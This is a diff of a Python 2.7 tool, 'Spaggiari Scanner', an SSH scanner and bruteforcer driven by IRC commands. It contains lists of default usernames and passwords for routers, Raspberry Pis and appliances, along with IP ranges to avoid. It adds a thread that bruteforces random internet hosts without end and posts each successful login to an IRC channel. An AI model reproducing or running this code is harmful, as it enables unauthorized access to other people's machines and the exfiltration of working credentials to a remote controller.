@@ -31,7 +31,7 @@ Bugs:
 - The @stop command is not perfect and doesn't fully stop scans in progress.
  
 Todo:
-- Create a more accurate and comprehensive spooky / dns list.
+- Create a more accurate and comprehensive spooky list.
 - Implement scanning for telnet and ftp.
 - Make use of 'deep_combos' after no successful logins.
 - Use pyinstaller to create a single executable.
@@ -52,7 +52,7 @@ import threading
 import time
 import urllib2
 
-# IRC Config
+# IRC Config (EDIT)
 server   = 'irc.server.com'
 port     = 6697
 use_ssl  = True
@@ -60,22 +60,22 @@ password = None
 channel  = '#dev'
 key      = None
 
-# Other Config
+# Other Config (EDIT)
 admin_host   = 'admin.host'
 control_char = '@'
 throttle     = 20
 
-# SSH Login Attempts
+# SSH Login Combos
 combos = {
-    'root'      : ['root','toor','admin','changeme','pass','password','1234','12345','123456'],
-    'admin'     : ['1234','12345','123456','4321','9999','abc123','admin','changeme','admin123','password'],
+    'root'      : ('root','toor','admin','changeme','pass','password','1234','12345','123456'),
+    'admin'     : ('1234','12345','123456','4321','9999','abc123','admin','changeme','admin123','password'),
     'cisco'     : 'cisco',
     'pi'        : 'raspberry',
 }
 
 deep_combos = {
-    'root'      : ['alien','alpine','calvin','kn1TG7psLu','logapp','openelec','pixmet2003','raspberrypi','rasplex','rootme','soho','TANDBERG','trendimsa1.0'],
-    'admin'     : ['aerohive','kn1TG7psLu','TANDBERG'],
+    'root'      : ('alien','alpine','calvin','kn1TG7psLu','logapp','openelec','pixmet2003','raspberrypi','rasplex','rootme','soho','TANDBERG','trendimsa1.0'),
+    'admin'     : ('aerohive','kn1TG7psLu','TANDBERG'),
     'alien'     : 'alien',
     'bitnami'   : 'bitnami',
     'device'    : 'apc',
@@ -88,26 +88,23 @@ deep_combos = {
     'sysadmin'  : 'PASS',
     'toor'      : 'logapp',
     'ubnt'      : 'ubnt',
-    'user'      : ['acme','live'],
+    'user'      : ('acme','live'),
     'vagrant'   : 'vagrant',
     'virl'      : 'VIRL',
     'vyos'      : 'vyos',
 }
 
-# Important Ranges
-lucky  = ['113.53','117.156','118.173','118.174','122.168','122.176','165.229','177.11','182.74','186.113','186.114','186.115','186.119','187.109','188.59','190.252','190.253','190.254','190.255','190.65','190.66','190.67','190.68','190.69','201.75','31.176','60.51','84.122','95.169','95.6','95.9']
-spooky = ['11','21','22','24','25','26','29','49','50','55','62','64','128','129','130','131','132','134','136','137','138','139','140','143','144','146','147','148','150','152','153','155','156','157','158','159','161','162','163','164','167','168','169','194','195','199','203','204','205','207','208','209','212','213','216','217','6','7']
-dns    = ['10','100.64','100.65','100.66','100.67','100.68','100.69','100.70','100.71','100.72','100.73','100.74','100.75','100.76','100.77','100.78','100.79','100.80','100.81','100.82','100.83','100.84','100.85','100.86','100.87','100.88','100.89','100.90','100.91','100.92','100.93','100.94','100.95','100.96','100.97','100.98','100.99','100.100','100.101','100.102','100.103','100.104','100.105','100.106','100.107','100.108','100.109','100.110','100.111','100.112','100.113','100.114','100.115','100.116','100.117','100.118','100.119','100.120','100.121','100.122','100.123','100.124','100.125','100.126','100.127','127','169.254','172.16','172.17','172.18','172.19','172.20','172.21','172.22','172.23','172.24','172.25','172.26','172.27','172.28','172.29','172.30','172.31','192.0.0','192.0.2','192.88.99','192.168','198.18','198.19','198.51.100','203.0.113','224','225','226','227','228','229','230','231','232','233','234','235','236','237','238','239','240','241','242','243','244','245','246','247','248','249','250','251','252','253','254','255']
+# Important Ranges (DO NOT EDIT)
+spooky   = ('11','21','22','24','25','26','29','49','50','55','62','64','128','129','130','131','132','134','136','137','138','139','140','143','144','146','147','148','150','152','153','155','156','157','158','159','161','162','163','164','167','168','169','194','195','199','203','204','205','207','208','209','212','213','216','217','6','7')
+reserved = ('0','10','100.64','100.65','100.66','100.67','100.68','100.69','100.70','100.71','100.72','100.73','100.74','100.75','100.76','100.77','100.78','100.79','100.80','100.81','100.82','100.83','100.84','100.85','100.86','100.87','100.88','100.89','100.90','100.91','100.92','100.93','100.94','100.95','100.96','100.97','100.98','100.99','100.100','100.101','100.102','100.103','100.104','100.105','100.106','100.107','100.108','100.109','100.110','100.111','100.112','100.113','100.114','100.115','100.116','100.117','100.118','100.119','100.120','100.121','100.122','100.123','100.124','100.125','100.126','100.127','127','169.254','172.16','172.17','172.18','172.19','172.20','172.21','172.22','172.23','172.24','172.25','172.26','172.27','172.28','172.29','172.30','172.31','172.32','192.0.0','192.0.2','192.88.99','192.168','198.18','198.19','198.51.100','203.0.113','224','225','226','227','228','229','230','231','232','233','234','235','236','237','238','239','240','241','242','243','244','245','246','247','248','249','250','251','252','253','254','255')
 
-# Formatting Control Characters
+# Formatting Control Characters / Color Codes
 bold        = '\x02'
 colour      = '\x03'
 italic      = '\x1D'
 underline   = '\x1F'
 reverse     = '\x16'
 reset       = '\x0f'
-
-# Color Codes
 white       = '00'
 black       = '01'
 blue        = '02'
@@ -126,14 +123,8 @@ grey        = '14'
 light_grey  = '15'
 
 # Debug Functions
-def action(msg):
-    print '%s | [#] - %s' % (get_time(), msg)
-
 def alert(msg):
     print '%s | [+] - %s' % (get_time(), msg)
-
-def check_ip(ip):
-    return re.match('^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$', ip)
 
 def check_root():
     if os.getuid() == 0 or os.geteuid() == 0:
@@ -146,6 +137,12 @@ def check_version(major, minor):
         return True
     else:
         return False
+
+def clear():
+    if get_windows():
+        os.system('cls')
+    else:
+        os.system('clear')
 
 def debug(msg):
     print '%s | [~] - %s' % (get_time(), msg)
@@ -176,31 +173,20 @@ def keep_alive():
 
 
 
-# Information
-def get_arch()     : return ' '.join(platform.architecture())
-def get_dist()     : return ' '.join(platform.linux_distribution())
-def get_home()     : return os.environ['HOME']
-def get_hostname() : return socket.gethostname()
-
-def get_ip():
-    try    : return re.findall(r'[0-9]+(?:\.[0-9]+){3}', urllib2.urlopen('http://checkip.dyndns.com/').read())[0]
-    except : return 'Unknown IP Address'
-
-def get_kernel()   : return platform.release()
-def get_username() : return getpass.getuser()
-
-
-
 # Functions
+def check_ip(ip):
+    return re.match('^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$', ip)
+
 def check_port(ip, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(1)
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(1)
         code = sock.connect((ip, port))
-        if not code  : return True
-        else         : return False
     except socket.error:
         return False
+    else:
+        if not code  : return True
+        else         : return False
     finally:
         sock.close()
 
@@ -215,7 +201,7 @@ def check_range(targets):
                 found   = True
                 break
         if breaker : break
-        for dns_range in dns:
+        for dns_range in reserved:
             if ip.startswith(dns_range + '.'):
                 breaker = True
                 found   = True
@@ -225,6 +211,28 @@ def check_range(targets):
 def color(msg, foreground, background=None):
     if background : return '%s%s,%s%s%s' % (colour, foreground, background, msg, reset)
     else          : return '%s%s%s%s'    % (colour, foreground, msg, reset)
+
+def get_arch():
+    return ' '.join(platform.architecture())
+
+def get_dist():
+    return ' '.join(platform.linux_distribution())
+
+def get_home():
+    return os.environ['HOME']
+
+def get_hostname():
+    return socket.gethostname()
+
+def get_ip():
+    try    : return re.findall(r'[0-9]+(?:\.[0-9]+){3}', urllib2.urlopen('http://checkip.dyndns.com/').read())[0]
+    except : return 'Unknown IP Address'
+
+def get_kernel():
+    return platform.release()
+
+def get_username():
+    return getpass.getuser()
 
 def ip_range(start_ip, end_ip):
     start = list(map(int, start_ip.split('.')))
@@ -242,10 +250,28 @@ def ip_range(start_ip, end_ip):
     random.shuffle(ip_range)
     return ip_range
 
-def random_ip()          : return '%s.%s.%s.%s' % (random_int(0,255), random_int(0,255), random_int(0,255), random_int(0,255))
-def random_int(min, max) : return random.randint(min, max)
-def random_str(size)     : return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(size))
+def random_ip():
+    return '%s.%s.%s.%s' % (random_int(0,255), random_int(0,255), random_int(0,255), random_int(0,255))
 
+def random_int(min, max):
+    return random.randint(min, max)
+
+def random_str(size):
+    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(size))
+
+
+
+# Scan Functions
+class idle_scan(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+    def run(self):
+        while True:
+            host = (random_ip())
+            if not check_range(host):
+                ssh_bruteforce(host).start()
+            time.sleep(throttle)
+                
 class scan(threading.Thread):
     def __init__(self, ip_range):
         self.ip_range = ip_range
@@ -285,12 +311,10 @@ class ssh_bruteforce(threading.Thread):
             error('%s does not have port 22 open.' % self.host)
 
 def ssh_connect(hostname, username, password):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(hostname, 22, username, password, timeout=10.0)
-        alert('Successful connection to %s using %s:%s' % (hostname, username, password))
-        SpaggiariBot.sendmsg(channel, '[%s] - Successful connection to %s using %s:%s' % (color('+', green), hostname, username, password))
     except paramiko.ssh_exception.AuthenticationException:
         error('Failed to connect to %s using %s:%s (Authentication Error)' % (hostname, username, password))
         SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s'  % (hostname, username, password), 'Authentication Error')
@@ -309,6 +333,9 @@ def ssh_connect(hostname, username, password):
     except Exception as ex:
         error('Failed to connect to %s using %s:%s (%s)'                  % (hostname, username, password, ex))
         SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (hostname, username, password), ex)
+    else:
+        alert('Successful connection to %s using %s:%s'                                % (hostname, username, password))
+        SpaggiariBot.sendmsg(channel, '[%s] - Successful connection to %s using %s:%s' % (color('+', green), hostname, username, password))
     finally:
         ssh.close()
 
@@ -428,10 +455,6 @@ class IRC(threading.Thread):
                             c_range = args[3]
                             start   = c_range + '.0'
                             end     = c_range + '.255'
-                        elif args[2] == 'lucky':
-                            lucky_range = random.choice(lucky)
-                            start       = lucky_range + '.0.0'
-                            end         = lucky_range + '.255.255'
                         else:
                             start = args[2]
                             end   = args[3]
@@ -506,6 +529,15 @@ class IRC(threading.Thread):
         self.raw('PRIVMSG %s :%s' % (target, msg))
 
 # Main
+clear()
+print ''.rjust(56, '#')
+print '#' + ''.center(54) + '#'
+print '#' + 'Spaggiari Scanner'.center(54) + '#'
+print '#' + 'A Secure Shell (SSH) scanner / bruteforcer controlled via the Internet Relay Chat (IRC) protocol.'.center(54) + '#'
+print '#' + 'Developed by acidvegas in Python 2.7'.center(54) + '#'
+print '#' + 'https://github.com/acidvegas/spaggiari/'.center(54) + '#'
+print '#' + ''.center(54) + '#'
+print ''.rjust(56, '#')
 if not check_version(2,7):
     error_exit('Spaggiari Scanner requires Python version 2.7 to run!')
 if get_windows():
